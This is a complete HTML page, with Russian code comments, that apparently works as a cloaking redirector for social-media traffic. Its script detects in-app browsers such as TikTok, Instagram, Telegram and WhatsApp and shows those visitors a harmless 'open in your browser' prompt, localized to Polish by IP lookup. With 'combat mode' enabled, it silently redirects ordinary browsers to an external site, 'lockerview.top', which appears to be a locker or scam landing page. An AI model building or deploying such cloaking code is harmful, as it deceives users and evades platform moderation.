<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Open in Browser</title>

    <script>
        // =================================================================
        // НАСТРОЙКИ
        // =================================================================
        
        // 1. Твоя ссылка для редиректа
        const REAL_LANDING_URL = "https://lockerview.top";

        // 2. БОЕВОЙ РЕЖИМ (false = редирект включен)
        const TEST_MODE = false; 

        function isInAppBrowser() {
            const ua = (navigator.userAgent || navigator.vendor || window.opera).toLowerCase();
            
            // 1. Поиск по названиям всех популярных соцсетей и мессенджеров
            const inAppMarkers = [
                'tiktok', 'bytedance', 'musical_ly', 
                'snssdk', 'aweme', 'trill', 'jianying', 
                'instagram', 'fbav', 'fban', 'fb_iab', 'vkontakte',
                'telegram', 'tgbot', 'viber', 'whatsapp', 'messenger'
            ];
            
            const isSocialApp = inAppMarkers.some(marker => ua.includes(marker));

            // 2. Универсальный отлов внутренних браузеров (WebView) 
            const isAndroidWebView = ua.includes('wv') || (ua.includes('android') && ua.includes('version/'));

            // 3. Жесткий отлов Телеграма (скрытые системные объекты)
            const hasTelegramInjection = typeof window.TelegramWebviewProxy !== 'undefined' || typeof window.TelegramGameProxy !== 'undefined';

            // 4. Отлов по Referrer (если Android-приложение "наследило" при переходе)
            const isAppReferrer = document.referrer && document.referrer.includes('android-app://');

            // 5. Отлов внутреннего браузера на iOS (вырезано слово Safari)
            const isIosWebView = /(iphone|ipod|ipad).*applewebkit(?!.*safari)/.test(ua);

            return isSocialApp || isAndroidWebView || hasTelegramInjection || isAppReferrer || isIosWebView;
        }

        // Защита для предпросмотра (чтобы сайт не ломался в редакторах кода)
        const isIframe = window.self !== window.top;

        // ЛОГИКА РЕДИРЕКТА
        if (!TEST_MODE && !isIframe) {
            // Если это нормальный браузер (НЕ внутренний) — моментально перекидываем
            if (!isInAppBrowser()) {
                window.location.replace(REAL_LANDING_URL); 
            }
        }
    </script>

    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #121212;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            touch-action: none;
        }

        .container {
            text-align: center;
            padding: 20px;
            max-width: 90%;
            z-index: 10;
        }

        .icon {
            font-size: 56px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 12px;
            font-weight: 700;
        }

        p {
            font-size: 16px;
            line-height: 1.5;
            color: #b0b0b0;
            margin-bottom: 30px;
        }

        .steps {
            background: #1e1e1e;
            border-radius: 16px;
            padding: 20px;
            text-align: left;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }

        .step {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .step:last-child {
            margin-bottom: 0;
        }

        .step-number {
            background: #fe2c55; 
            color: white;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 16px;
            margin-right: 15px;
            flex-shrink: 0;
        }

        .step-text {
            font-size: 15px;
            line-height: 1.4;
        }

        .arrow {
            position: absolute;
            top: 25px;
            right: 25px;
            width: 60px;
            height: 60px;
            animation: bounce 0.8s infinite alternate ease-in-out;
            z-index: 20;
        }

        @keyframes bounce {
            0% { transform: translate(0, 0); }
            100% { transform: translate(15px, -15px); }
        }
    </style>

<body>

    <!-- Векторная стрелка -->
    <svg class="arrow" viewBox="0 0 24 24" fill="none" stroke="#fe2c55" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
        <line x1="5" y1="19" x2="19" y2="5"></line>
        <polyline points="9 5 19 5 19 15"></polyline>
    </svg>

    <!-- Основной контент (с ID для локализации) -->
    <div class="container">
        <div class="icon">🚀</div>
        <h1 id="text-title">Almost there!</h1>
        <p id="text-subtitle">To continue, please open this page in your phone's browser.</p>

        <div class="steps">
            <div class="step">
                <div class="step-number">1</div>
                <div class="step-text" id="text-step1">Tap the three dots <strong>in the top right corner</strong>.</div>
            </div>
            <div class="step">
                <div class="step-number">2</div>
                <div class="step-text" id="text-step2">Select <strong>"Open in browser"</strong>.</div>
            </div>
        </div>
    </div>

    <!-- Скрипт локализации по IP -->
    <script>
        const translations = {
            pl: {
                title: "Prawie gotowe!",
                subtitle: "Aby kontynuować, otwórz tę stronę w przeglądarce telefonu.",
                step1: "Stuknij w trzy kropki <strong>w prawym górnym rogu</strong>.",
                step2: "Wybierz <strong>«Otwórz w przeglądarce»</strong> (Open in browser)."
            }
        };

        async function applyLocalization() {
            try {
                const response = await fetch('https://get.geojs.io/v1/ip/country.json');
                const data = await response.json();
                
                if (data.country === 'PL') {
                    document.getElementById('text-title').innerHTML = translations.pl.title;
                    document.getElementById('text-subtitle').innerHTML = translations.pl.subtitle;
                    document.getElementById('text-step1').innerHTML = translations.pl.step1;
                    document.getElementById('text-step2').innerHTML = translations.pl.step2;
                }
            } catch (error) {
                console.log("Локализация: английский по умолчанию.");
            }
        }

        document.addEventListener("DOMContentLoaded", applyLocalization);
    </script>

</body>
</html>
